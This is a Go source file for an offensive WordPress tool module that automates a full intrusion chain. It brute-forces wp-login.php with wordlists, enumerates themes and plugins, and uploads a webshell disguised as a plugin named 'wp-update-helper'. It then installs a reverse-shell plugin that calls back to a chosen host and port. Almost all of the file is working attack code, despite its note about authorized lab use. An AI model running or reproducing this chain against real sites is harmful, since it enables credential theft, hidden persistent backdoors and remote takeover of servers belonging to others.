// Chain module: brute -> find theme/plugin → upload backdoor shell → back-connect.
// Runs the full kill chain in one run for authorized lab use.
package backdoor

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/lab/wpforge/internal/engine"
	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/payload"
	"github.com/lab/wpforge/internal/registry"
	"github.com/lab/wpforge/internal/shell"
	"github.com/lab/wpforge/internal/wordlist"
)

// Chain runs the full attack chain in one run: brute force login (if no
// creds), find an up theme/plugin, upload backdoor shell via admin upload,
// and back-connect via reverse shell callback.
type Chain struct{}

func init() { registry.Register(Chain{}) }

// Meta implements module.Module.
func (Chain) Meta() module.Meta {
	return module.Meta{
		ID:        "chain-full",
		Name:      "Full attack chain (brute > backdoor > back-connect)",
		Component: "core (wp-login.php + plugin-install.php)",
		Primitive: module.PrimitiveBackdoor,
		AuthLevel: module.AuthNone, // brute may obtain creds itself
		Notes:     "Stages: 1) wp-login brute (SecLists) if no creds; 2) enumerate active theme + plugins; 3) upload token-gated PHP shell as plugin (requires admin); 4) reverse-shell back-connect with listener; registers session.",
	}
}

// Params implements module.Module.
func (Chain) Params() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "userlist", Label: "Brute users (preset/URL/file/inline)", Default: "seclists:usernames-top100"},
		{Name: "passlist", Label: "Brute passwords", Default: "seclists:passwords-top500"},
		{Name: "lhost", Label: "Back-connect host (your IP)", Default: "127.0.0.1"},
		{Name: "lport", Label: "Back-connect port", Default: "4444"},
		{Name: "token", Label: "Shell token", Default: "changeme-token", Secret: true},
		{Name: "shellname", Label: "Shell plugin slug", Default: "wp-update-helper"},
		{Name: "no_reverse", Label: "Skip reverse (webshell only): yes/no", Default: "no"},
	}
}

// Run implements module.Module.
func (Chain) Run(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) *module.Result {
	res := &module.Result{Artifacts: map[string]string{}}
	token := orDefaultBD(params["token"], "changeme-token")
	slug := orDefaultBD(params["shellname"], "wp-update-helper")
	lhost := orDefaultBD(params["lhost"], "127.0.0.1")
	lport := 4444
	fmt.Sscanf(params["lport"], "%d", &lport)

	// ---- Stage 1: credentials (use provided, else brute) ----
	if t.Creds.Username == "" {
		log.Infof("[1/4] no creds - brute forcing wp-login.php ...")
		br := chainBrute(ctx, t, params, log)
		if br == "" {
			res.Summary = "stage 1 failed: no valid creds found"
			log.Errorf("%s", res.Summary)
			return res
		}
		u, p, _ := strings.Cut(br, ":")
		t.Creds.Username, t.Creds.Password = u, p
	}
	log.Successf("[1/4] creds: %s", t.Creds.Username)

	// ---- Stage 2: find active theme + plugins ----
	log.Infof("[2/4] enumerating active theme / plugins ...")
	theme, plugins := chainRecon(ctx, t, log)
	res.Artifacts["theme"] = theme
	res.Artifacts["plugins"] = strings.Join(plugins, ", ")

	// ---- Stage 3: upload backdoor shell plugin ----
	log.Infof("[3/4] uploading backdoor shell plugin %q ...", slug)
	shellURL, err := chainUpload(ctx, t, slug, token, log)
	if err != nil {
		res.Err = err
		log.Errorf("upload failed: %v", err)
		return res
	}
	sess := shell.M().RegisterWebshell(shellURL, token, "c")
	log.Successf("webshell session: %s -> %s", sess.ID, shellURL)
	res.Artifacts["session_id"] = sess.ID
	res.Artifacts["shell_url"] = shellURL
	res.Success = true

	// ---- Stage 4: back-connect (reverse shell) ----
	if strings.EqualFold(orDefaultBD(params["no_reverse"], "no"), "yes") {
		res.Summary = "chain done (webshell only): " + shellURL
		return res
	}
	log.Infof("[4/4] back-connect: uploading reverse payload, waiting for callback ...")
	revSess, err := chainReverse(ctx, t, slug, token, lhost, lport, log)
	if err != nil {
		log.Warnf("back-connect failed (%v) - webshell session %s still usable", err, sess.ID)
		res.Summary = "chain done, webshell only (back-connect failed)"
		return res
	}
	log.Successf("reverse session live: %s from %s", revSess.ID, revSess.Target)
	res.Artifacts["reverse_session"] = revSess.ID
	res.Summary = fmt.Sprintf("full chain: webshell %s + reverse %s", sess.ID, revSess.ID)
	return res
}

// chainBrute runs wp-login brute inline; returns "user:pass" or "".
func chainBrute(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) string {
	users, err := wordlist.Load(ctx, orDefaultBD(params["userlist"], "seclists:usernames-top100"), 0)
	if err != nil {
		log.Warnf("userlist failed: %v", err)
		users = []string{"admin"}
	}
	passes, err := wordlist.Load(ctx, orDefaultBD(params["passlist"], "seclists:passwords-top500"), 0)
	if err != nil {
		log.Warnf("passlist failed: %v", err)
		passes = []string{"admin", "password", "123456"}
	}
	log.Infof("brute: %d users x %d passwords", len(users), len(passes))
	for _, user := range users {
		for _, pass := range passes {
			if ctx.Err() != nil {
				return ""
			}
			if chainTryLogin(ctx, t, user, pass) {
				return user + ":" + pass
			}
		}
	}
	return ""
}

// chainTryLogin is a lightweight wp-login.php probe.
func chainTryLogin(ctx context.Context, t *module.Target, user, pass string) bool {
	code, body, err := t.Client.PostForm(ctx, "/wp-login.php", map[string][]string{
		"log": {user}, "pwd": {pass}, "wp-submit": {"Log In"},
		"redirect_to": {strings.TrimRight(t.BaseURL, "/") + "/wp-admin/"},
		"testcookie":  {"1"},
	})
	if err != nil || code != 200 {
		return false
	}
	return strings.Contains(body, "wp-admin") && !strings.Contains(body, "<form name=\"loginform\"")
}

// chainRecon grabs the active theme and plugin list.
func chainRecon(ctx context.Context, t *module.Target, log module.Logger) (string, []string) {
	theme := ""
	plugins := []string{}
	_, body, err := t.Client.Get(ctx, "/")
	if err == nil {
		m := regexp.MustCompile(`/wp-content/themes/([A-Za-z0-9_-]+)/`).FindStringSubmatch(body)
		if len(m) > 1 {
			theme = m[1]
			log.Successf("active theme: %s", theme)
		}
	}
	code, body, err := t.Client.Get(ctx, "/wp-admin/plugins.php")
	if err == nil && code == 200 {
		for _, mm := range regexp.MustCompile(`wp-content/plugins/([A-Za-z0-9_-]+)/`).FindAllStringSubmatch(body, -1) {
			plugins = append(plugins, mm[1])
		}
	}
	if len(plugins) > 0 {
		log.Infof("plugins visible: %s", strings.Join(plugins, ", "))
	}
	return theme, plugins
}

// chainUpload logs in and installs the token-gated webshell plugin.
func chainUpload(ctx context.Context, t *module.Target, slug, token string, log module.Logger) (string, error) {
	if err := t.Client.WPLogin(ctx, t.Creds.Username, t.Creds.Password); err != nil {
		return "", fmt.Errorf("login: %w", err)
	}
	code, body, err := t.Client.Get(ctx, "/wp-admin/plugin-install.php")
	if err != nil || code != 200 {
		return "", fmt.Errorf("plugin-install fetch: status=%d err=%v", code, err)
	}
	nonce := firstMatchBD(body, `name="_wpnonce" value="([a-f0-9]{10})"`)
	if nonce == "" {
		nonce = firstMatchBD(body, `_wpnonce=([a-f0-9]{10})`)
	}
	if nonce == "" {
		return "", fmt.Errorf("upload nonce not found")
	}
	zipBytes, err := zipInMemoryBD(map[string]string{
		slug + "/" + slug + ".php": pluginHeader(slug) + payload.TokenShell(token),
	})
	if err != nil {
		return "", err
	}
	upCode, _, err := t.Client.MultipartPost(ctx, "/wp-admin/update.php?action=upload-plugin",
		map[string]string{"_wpnonce": nonce, "action": "upload-plugin"},
		map[string]engine.UploadFile{"pluginzip": {Filename: slug + ".zip", Content: zipBytes, ContentType: "application/zip"}})
	if err != nil || upCode != 200 {
		return "", fmt.Errorf("upload: status=%d err=%v", upCode, err)
	}
	return strings.TrimRight(t.BaseURL, "/") + "/wp-content/plugins/" + slug + "/" + slug + ".php", nil
}

// chainReverse deploys the reverse-shell plugin and waits for the callback.
func chainReverse(ctx context.Context, t *module.Target, slug, token, lhost string, lport int, log module.Logger) (*shell.Session, error) {
	_, stop, err := shell.StartListener(ctx, lport, nil)
	if err != nil {
		return nil, fmt.Errorf("listener: %w", err)
	}
	defer stop()

	zipBytes, err := zipInMemoryBD(map[string]string{
		slug + "-rev/" + slug + "-rev.php": pluginHeader(slug+"-rev") + payload.ReverseShell(lhost, lport, token),
	})
	if err != nil {
		return nil, err
	}
	code, body, err := t.Client.Get(ctx, "/wp-admin/plugin-install.php")
	if err != nil || code != 200 {
		return nil, fmt.Errorf("plugin-install fetch: status=%d err=%v", code, err)
	}
	nonce := firstMatchBD(body, `name="_wpnonce" value="([a-f0-9]{10})"`)
	if nonce == "" {
		nonce = firstMatchBD(body, `_wpnonce=([a-f0-9]{10})`)
	}
	upCode, _, err := t.Client.MultipartPost(ctx, "/wp-admin/update.php?action=upload-plugin",
		map[string]string{"_wpnonce": nonce, "action": "upload-plugin"},
		map[string]engine.UploadFile{"pluginzip": {Filename: slug + "-rev.zip", Content: zipBytes, ContentType: "application/zip"}})
	if err != nil || upCode != 200 {
		return nil, fmt.Errorf("upload: status=%d err=%v", upCode, err)
	}

	// Trigger the reverse shell via HTTP while waiting for the TCP callback.
	trig := strings.TrimRight(t.BaseURL, "/") + "/wp-content/plugins/" + slug + "-rev/" + slug + "-rev.php?t=" + token
	log.Infof("triggering: %s", trig)
	go func() {
		cctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		_, _, _ = t.Client.Get(cctx, "/wp-content/plugins/"+slug+"-rev/"+slug+"-rev.php?t="+token)
	}()

	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		for _, s := range shell.M().List() {
			if s.Kind == "reverse" && time.Since(s.CreatedAt) < 25*time.Second {
				return s, nil
			}
		}
		time.Sleep(300 * time.Millisecond)
	}
	return nil, fmt.Errorf("no callback within 20s (egress blocked or wrong lhost)")
}

var _ module.Module = Chain{}